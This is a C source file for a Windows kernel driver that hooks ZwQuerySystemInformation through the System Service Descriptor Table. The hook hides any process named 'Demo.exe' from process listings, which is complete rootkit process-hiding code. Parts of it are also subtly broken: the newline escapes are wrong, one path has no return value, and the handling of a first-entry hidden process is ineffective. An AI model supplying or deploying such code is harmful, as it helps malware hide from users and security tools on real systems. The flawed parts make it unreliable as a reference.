#ifdef __cplusplus
extern "C"
{
#endif

#include <ntddk.h>

#pragma pack(1)
typedef struct ServiceDescriptorEntry
{
    unsigned int *ServiceTableBase;
    unsigned int *ServiceCounterTableBase; //Used only in checked build
    unsigned int NumberOfServices;
    unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

typedef struct _SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER SpareLi1;
    LARGE_INTEGER SpareLi2;
    LARGE_INTEGER SpareLi3;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR PageDirectoryBase;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;;

extern ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
NTKERNELAPI NTSTATUS ZwQuerySystemInformation( IN ULONG SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength );

typedef NTSTATUS( *ZWQUERYSYSTEMINFORMATION )( ULONG SystemInformationCLass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength );
ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;
PMDL  pMdlSSDT = NULL;
PVOID* pMapSSDT = NULL;

ULONG GetSysFuncIndex( ULONG pFunc )
{
    // 计算方法参考：http://blog.csdn.net/yjz1409276/article/details/17049417
    return *( PULONG )( ( PUCHAR )pFunc + 1 );
}

ULONG GetSysFuncAddr( ULONG pFunc )
{
    ULONG FuncIndex = GetSysFuncIndex( pFunc );
    return *( ( ( PULONG ) * KeServiceDescriptorTable.ServiceTableBase ) + FuncIndex );
}

ULONG HookSysFunc( ULONG pSysFunc, ULONG pNewFunc )
{
    KdPrint( ( "Enter HookSysFunc/n" ) );
    __try
    {
        PULONG pSysAddr = ( PULONG )( pMapSSDT ) + GetSysFuncIndex( pSysFunc );
        return InterlockedExchange( ( PLONG )pSysAddr , ( ULONG )pNewFunc );
    }
    __except ( EXCEPTION_EXECUTE_HANDLER )
    {
        KdPrint( ( "HookSysFunc Occurred Exception/n" ) );
    }
}

ULONG UnHookSysFunc( ULONG pSysFunc, ULONG pOldFunc )
{
    KdPrint( ( "Enter UnHookSysFunc/n" ) );
    __try
    {
        PULONG pSysAddr = ( PULONG )( pMapSSDT ) + GetSysFuncIndex( pSysFunc );
        return InterlockedExchange( ( PLONG )pSysAddr , ( ULONG ) pOldFunc );
    }
    __except ( EXCEPTION_EXECUTE_HANDLER )
    {
        KdPrint( ( "UnHookSysFunc Occurred Exception/n" ) );
    }
    return 0;
}

VOID DriverUnload( IN PDRIVER_OBJECT DriverObject )
{
    KdPrint( ( "Enter DriverUnload/n" ) );
    
    UnHookSysFunc( ( ULONG )ZwQuerySystemInformation, ( ULONG )OldZwQuerySystemInformation );
    
    if ( NULL != pMdlSSDT )
    {
        MmUnmapLockedPages( pMapSSDT, pMdlSSDT );
        IoFreeMdl( pMdlSSDT );
    }
}

NTSTATUS NewZwQuerySystemInformation( IN ULONG SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength )
{
    KdPrint( ( "Enter NewZwQuerySystemInformation/n" ) );
    
    NTSTATUS ntStatus;
    
    ntStatus = ( ( ZWQUERYSYSTEMINFORMATION )( OldZwQuerySystemInformation ) )( SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength );
    
    if ( NT_SUCCESS( ntStatus ) )
    {
        if ( SystemInformationClass == 5 )
        {
            PSYSTEM_PROCESS_INFORMATION curr = ( PSYSTEM_PROCESS_INFORMATION )SystemInformation;
            PSYSTEM_PROCESS_INFORMATION prev = NULL;
            UNICODE_STRING hideName;
            RtlInitUnicodeString( &hideName, L"Demo.exe" );
            while ( curr )
            {
                //DbgPrint("Current item is %x\n", curr);
                if ( curr->ImageName.Buffer != NULL )
                {
                    if ( 0 == RtlCompareUnicodeString( &curr->ImageName, &hideName, FALSE ) )
                    {
                        if ( prev ) // Middle or Last entry
                        {
                            if ( curr->NextEntryOffset )
                                prev->NextEntryOffset += curr->NextEntryOffset;
                            else	// we are last, so make prev the end
                                prev->NextEntryOffset = 0;
                        }
                        else
                        {
                            if ( curr->NextEntryOffset )
                            {
                                // we are first in the list, so move it forward
                                SystemInformation = ( PCHAR )SystemInformation + curr->NextEntryOffset;
                            }
                            else // we are the only process!
                                SystemInformation = NULL;
                        }
                    }
                }
                prev = curr;
                if ( curr->NextEntryOffset )
                    ( curr = ( PSYSTEM_PROCESS_INFORMATION )( ( PCHAR )curr + curr->NextEntryOffset ) );
                else
                    curr = NULL;
            }
        }
    }
    return ntStatus;
}

NTSTATUS DefaultHandler( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
    KdPrint( ( "Enter DefaultHandler/n" ) );
    
    Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest( Irp, IO_NO_INCREMENT );
    return Irp->IoStatus.Status;
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath )
{
    KdPrint( ( "Enter DriverEntry/n" ) );
    
    for ( int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++ )
    {
        DriverObject->MajorFunction[i] = DefaultHandler;
    }
    
    DriverObject->DriverUnload  = DriverUnload;
    
    __try
    {
        OldZwQuerySystemInformation = ( ZWQUERYSYSTEMINFORMATION )GetSysFuncAddr( ( ULONG )ZwQuerySystemInformation );
        //        pMdlSSDT = MmCreateMdl( NULL, ( PULONG ) * KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices * 4 );
        pMdlSSDT = IoAllocateMdl( ( PULONG ) * KeServiceDescriptorTable.ServiceTableBase,
                                  KeServiceDescriptorTable.NumberOfServices * 4, FALSE, FALSE, NULL );
        if ( NULL == pMdlSSDT )
        {
            return STATUS_UNSUCCESSFUL;
        }
        MmBuildMdlForNonPagedPool( pMdlSSDT );
        pMdlSSDT->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
        //        pMapSSDT = ( PVOID* )MmMapLockedPages( pMdlSSDT, KernelMode );
        pMapSSDT = ( PVOID* )MmMapLockedPagesSpecifyCache( pMdlSSDT, KernelMode, MmNonCached, NULL, FALSE, HighPagePriority );
        if ( NULL == pMapSSDT )
        {
            return STATUS_UNSUCCESSFUL;
        }
        
        HookSysFunc( ( ULONG )ZwQuerySystemInformation , ( ULONG )NewZwQuerySystemInformation );
        return STATUS_SUCCESS;
    }
    __except ( EXCEPTION_EXECUTE_HANDLER )
    {
    
    }
    return STATUS_UNSUCCESSFUL;
    
}

#ifdef __cplusplus
}
#endif

